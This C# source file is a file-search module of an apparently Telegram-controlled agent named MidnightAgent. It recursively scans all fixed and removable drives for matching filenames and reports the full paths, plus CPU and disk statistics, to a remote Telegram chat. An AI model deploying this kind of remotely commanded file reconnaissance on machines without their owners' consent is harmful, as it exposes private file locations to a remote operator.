using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using MidnightAgent.Core;
using MidnightAgent.Telegram;

namespace MidnightAgent.Features
{
    /// <summary>
    /// Search files across all user-writable drives with live Telegram progress
    /// /search <filename> - Start searching
    /// /search stop - Stop searching
    /// </summary>
    public class SearchFeature : IFeature
    {
        public static TelegramService TelegramInstance { get; set; }

        public string Command => "search";
        public string Description => "Search files with live progress";
        public string Usage => "/search <filename> | /search stop";

        // Spinner frames
        private static readonly string[] Spinner = { "⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏" };

        // Search state
        private static CancellationTokenSource _searchCts;
        private static bool _isSearching = false;
        private static readonly object _lock = new object();

        // Performance counters
        private static PerformanceCounter _cpuCounter;
        private static PerformanceCounter _diskCounter;

        public async Task<FeatureResult> ExecuteAsync(string[] args)
        {
            if (args.Length == 0)
                return FeatureResult.Fail("Usage:\n/search &lt;filename&gt; - Start search\n/search stop - Stop search");

            // --- STOP ---
            if (args[0].Equals("stop", StringComparison.OrdinalIgnoreCase))
            {
                lock (_lock)
                {
                    if (_isSearching && _searchCts != null)
                    {
                        _searchCts.Cancel();
                        return FeatureResult.Ok("🛑 Search stop requested.");
                    }
                    return FeatureResult.Ok("ℹ️ No search is running.");
                }
            }

            // --- START SEARCH ---
            lock (_lock)
            {
                if (_isSearching)
                    return FeatureResult.Fail("⚠️ Search already running. Use /search stop first.");
                _isSearching = true;
                _searchCts = new CancellationTokenSource();
            }

            string rawPattern = string.Join(" ", args);
            // Split by comma for multi-pattern search
            string[] patterns = rawPattern.Split(new[] { ',' }, StringSplitOptions.RemoveEmptyEntries)
                .Select(p => p.Trim()).Where(p => p.Length > 0).ToArray();
            
            if (patterns.Length == 0)
            {
                lock (_lock) { _isSearching = false; }
                return FeatureResult.Fail("No valid patterns provided.");
            }

            var cts = _searchCts;
            string displayPatterns = string.Join(" | ", patterns);

            // Run search in background
            _ = Task.Run(() => RunSearch(patterns, displayPatterns, cts.Token));

            return FeatureResult.Ok($"🔍 Starting search for: <b>{displayPatterns}</b>");
        }

        private void RunSearch(string[] patterns, string displayPattern, CancellationToken token)
        {
            int messageId = 0;
            int spinIdx = 0;
            int filesScanned = 0;
            int foldersScanned = 0;
            var results = new List<string>();
            string currentDir = "";
            DateTime lastUpdate = DateTime.MinValue;
            DateTime startTime = DateTime.Now;
            int lastFoundCount = 0;

            try
            {
                // Init performance counters
                InitCounters();

                // Send initial message
                messageId = TelegramInstance?.SendMessageWithId(
                    $"🔍 <b>Search Started</b>\n" +
                    $"Pattern: <b>{EscapeHtml(displayPattern)}</b>\n" +
                    $"({patterns.Length} keyword{(patterns.Length > 1 ? "s" : "")})\n" +
                    $"{Spinner[0]} Initializing...") ?? 0;

                // Get all user-writable drives (skip system-only drives)
                var searchRoots = GetSearchRoots();

                foreach (var root in searchRoots)
                {
                    if (token.IsCancellationRequested) break;
                    SearchDirectory(root, patterns, displayPattern, token, ref filesScanned, ref foldersScanned,
                        results, ref currentDir, ref spinIdx, ref lastUpdate, messageId, startTime, ref lastFoundCount);
                }
            }
            catch (OperationCanceledException) { }
            catch (Exception ex)
            {
                try { TelegramInstance?.SendMessage($"❌ Search error: {ex.Message}"); } catch { }
            }
            finally
            {
                lock (_lock)
                {
                    _isSearching = false;
                }

                // การส่งข้อความสรุปผล ต้องครอบด้วย try-catch เสมอ ป้องกันการตายเงียบ
                try
                {
                    var elapsed = DateTime.Now - startTime;
                    string status = token.IsCancellationRequested ? "🛑 <b>Search Stopped</b>" : "✅ <b>Search Complete</b>";

                    string resultText = $"{status}\n" +
                        $"Pattern: <b>{EscapeHtml(displayPattern)}</b>\n" +
                        $"⏱ Time: {elapsed.Minutes}m {elapsed.Seconds}s\n" +
                        $"📁 Folders: {foldersScanned:N0} | 📄 Files: {filesScanned:N0}\n\n";

                    bool sendAsFile = results.Count > 25;

                    if (results.Count > 0)
                    {
                        resultText += $"🎯 <b>Found {results.Count} file(s):</b>\n";
                        
                        if (sendAsFile)
                        {
                            resultText += "📄 <i>Results are too many, sending as text file...</i>";
                        }
                        else
                        {
                            foreach (var r in results)
                            {
                                resultText += $"  📄 <code>{EscapeHtml(r)}</code>\n";
                            }
                        }
                    }
                    else
                    {
                        resultText += "❌ No files found.";
                    }

                    // Update or send the summary message
                    if (messageId > 0)
                    {
                        try { TelegramInstance?.EditMessage(messageId, resultText); }
                        catch { TelegramInstance?.SendMessage(resultText); }
                    }
                    else
                    {
                        TelegramInstance?.SendMessage(resultText);
                    }

                    // If too many results, send as document
                    if (sendAsFile)
                    {
                        try
                        {
                            StringBuilder sb = new StringBuilder();
                            sb.AppendLine($"Search Results for: {displayPattern}");
                            sb.AppendLine($"Time: {elapsed.Minutes}m {elapsed.Seconds}s");
                            sb.AppendLine($"Total Found: {results.Count}");
                            sb.AppendLine(new string('-', 30));
                            foreach (var r in results)
                            {
                                sb.AppendLine(r);
                            }

                            byte[] fileData = Encoding.UTF8.GetBytes(sb.ToString());
                            TelegramInstance?.SendDocument(fileData, $"search_results_{DateTime.Now:yyyyMMdd_HHmmss}.txt", $"🎯 Results for {displayPattern}");
                        }
                        catch (Exception fileEx)
                        {
                            TelegramInstance?.SendMessage($"⚠️ Failed to send results file: {fileEx.Message}");
                        }
                    }
                }
                catch (Exception finalEx)
                {
                    // Fallback สุดท้ายถ้าส่งสรุปไม่ได้จริงๆ
                    try { TelegramInstance?.SendMessage($"✅ Search Complete, but failed to send summary: {finalEx.Message}"); } catch { }
                }
                finally
                {
                    DisposeCounters();
                }
            }
        }

        private void SearchDirectory(string path, string[] patterns, string displayPattern, CancellationToken token,
            ref int filesScanned, ref int foldersScanned, List<string> results,
            ref string currentDir, ref int spinIdx, ref DateTime lastUpdate,
            int messageId, DateTime startTime, ref int lastFoundCount)
        {
            if (token.IsCancellationRequested) return;

            try
            {
                foldersScanned++;
                currentDir = path;

                // Search files in current directory
                try
                {
                    foreach (var file in Directory.GetFiles(path))
                    {
                        if (token.IsCancellationRequested) return;
                        filesScanned++;

                        string fileName = Path.GetFileName(file);
                        if (MatchAnyPattern(fileName, patterns))
                        {
                            results.Add(file);
                        }
                    }
                }
                catch { } // Access denied - skip

                // Update Telegram message:
                // อัปเดตทุกๆ 2 วินาทีเท่านั้น เพื่อป้องกัน Telegram API Rate Limit (429 Too Many Requests)
                if (results.Count > lastFoundCount) 
                {
                    lastFoundCount = results.Count; // อัปเดตจำนวนที่เจอ แต่ไม่บังคับให้ส่งข้อความทันที
                }

                if (messageId > 0 && (DateTime.Now - lastUpdate).TotalMilliseconds > 2000)
                {
                    lastUpdate = DateTime.Now;
                    spinIdx = (spinIdx + 1) % Spinner.Length;
                    var elapsed = DateTime.Now - startTime;

                    string cpu = GetCpuUsage();
                    string disk = GetDiskUsage();

                    // Shorten path for display
                    string displayDir = currentDir.Length > 45
                        ? "..." + currentDir.Substring(currentDir.Length - 42)
                        : currentDir;

                    // Build found files list (live view)
                    string foundList = "";
                    if (results.Count > 0)
                    {
                        foundList = "\n🎯 <b>Found Files:</b>\n";
                        // Show last 10 found files for immediate visibility
                        int showCount = Math.Min(results.Count, 10);
                        var showFiles = results.Skip(Math.Max(0, results.Count - 10)).Take(10);
                        
                        foreach (var f in showFiles)
                        {
                            foundList += $"  📄 <code>{EscapeHtml(Path.GetFileName(f))}</code>\n";
                        }
                        
                        if (results.Count > 10)
                            foundList += $"  <i>...and {results.Count - 10} earlier</i>\n";
                    }

                    string progressText =
                        $"🔍 <b>Searching...</b>\n" +
                        $"Pattern: <b>{EscapeHtml(displayPattern)}</b>\n\n" +
                        $"{Spinner[spinIdx]} <code>{EscapeHtml(displayDir)}</code>\n\n" +
                        $"📁 Folders: {foldersScanned:N0} | 📄 Files: {filesScanned:N0}\n" +
                        $"🎯 Found: {results.Count}\n" +
                        $"⏱ {elapsed.Minutes}m {elapsed.Seconds}s\n\n" +
                        $"💻 CPU: {cpu} | 💾 Disk: {disk}\n" +
                        $"{foundList}\n" +
                        $"<i>Send /search stop to cancel</i>";

                    try { TelegramInstance?.EditMessage(messageId, progressText); }
                    catch { } // ปล่อยผ่านถ้า error เพื่อให้ค้นหาต่อไปไม่สะดุด
                }

                // Recurse into subdirectories
                try
                {
                    foreach (var dir in Directory.GetDirectories(path))
                    {
                        if (token.IsCancellationRequested) return;

                        string dirName = Path.GetFileName(dir).ToLower();
                        // Skip system/protected directories
                        if (dirName == "windows" || dirName == "system32" ||
                            dirName == "syswow64" || dirName == "winsxs" ||
                            dirName == "$recycle.bin" || dirName == "system volume information" ||
                            dirName == "recovery" || dirName == "boot")
                            continue;

                        SearchDirectory(dir, patterns, displayPattern, token, ref filesScanned, ref foldersScanned,
                            results, ref currentDir, ref spinIdx, ref lastUpdate, messageId, startTime, ref lastFoundCount);
                    }
                }
                catch { } // Access denied - skip
            }
            catch { } // General access error - skip
        }

        /// <summary>
        /// Check if filename matches ANY of the patterns (OR logic)
        /// </summary>
        private bool MatchAnyPattern(string fileName, string[] patterns)
        {
            foreach (var pattern in patterns)
            {
                if (MatchSinglePattern(fileName, pattern))
                    return true;
            }
            return false;
        }

        /// <summary>
        /// Wildcard pattern matching (* and ?) or contains match
        /// </summary>
        private bool MatchSinglePattern(string fileName, string pattern)
        {
            // If pattern has no wildcards, do contains match (case insensitive)
            if (!pattern.Contains("*") && !pattern.Contains("?"))
                return fileName.IndexOf(pattern, StringComparison.OrdinalIgnoreCase) >= 0;

            // Simple wildcard matching
            return MatchWildcard(fileName.ToLower(), pattern.ToLower(), 0, 0);
        }

        private bool MatchWildcard(string str, string pat, int si, int pi)
        {
            while (si < str.Length && pi < pat.Length)
            {
                if (pat[pi] == '*')
                {
                    pi++;
                    if (pi >= pat.Length) return true;
                    for (int i = si; i <= str.Length; i++)
                    {
                        if (MatchWildcard(str, pat, i, pi)) return true;
                    }
                    return false;
                }
                else if (pat[pi] == '?' || pat[pi] == str[si])
                {
                    si++; pi++;
                }
                else return false;
            }
            while (pi < pat.Length && pat[pi] == '*') pi++;
            return si == str.Length && pi == pat.Length;
        }

        /// <summary>
        /// Get all user-writable search roots (skip Windows system folder)
        /// </summary>
        private List<string> GetSearchRoots()
        {
            var roots = new List<string>();

            // All fixed drives
            foreach (var drive in DriveInfo.GetDrives())
            {
                if (drive.IsReady && (drive.DriveType == DriveType.Fixed || drive.DriveType == DriveType.Removable))
                {
                    roots.Add(drive.RootDirectory.FullName);
                }
            }

            return roots;
        }

        // ========================================
        // Performance Counters
        // ========================================
        private void InitCounters()
        {
            try
            {
                _cpuCounter = new PerformanceCounter("Processor", "% Processor Time", "_Total");
                _cpuCounter.NextValue(); // First call is always 0
            }
            catch { _cpuCounter = null; }

            try
            {
                _diskCounter = new PerformanceCounter("PhysicalDisk", "% Disk Time", "_Total");
                _diskCounter.NextValue();
            }
            catch { _diskCounter = null; }
        }

        private string GetCpuUsage()
        {
            try { return $"{_cpuCounter?.NextValue():0}%"; }
            catch { return "N/A"; }
        }

        private string GetDiskUsage()
        {
            try { return $"{_diskCounter?.NextValue():0}%"; }
            catch { return "N/A"; }
        }

        private void DisposeCounters()
        {
            try { _cpuCounter?.Dispose(); } catch { }
            try { _diskCounter?.Dispose(); } catch { }
        }

        private string EscapeHtml(string input)
        {
            return input?.Replace("&", "&amp;").Replace("<", "&lt;").Replace(">", "&gt;") ?? "";
        }
    }
}
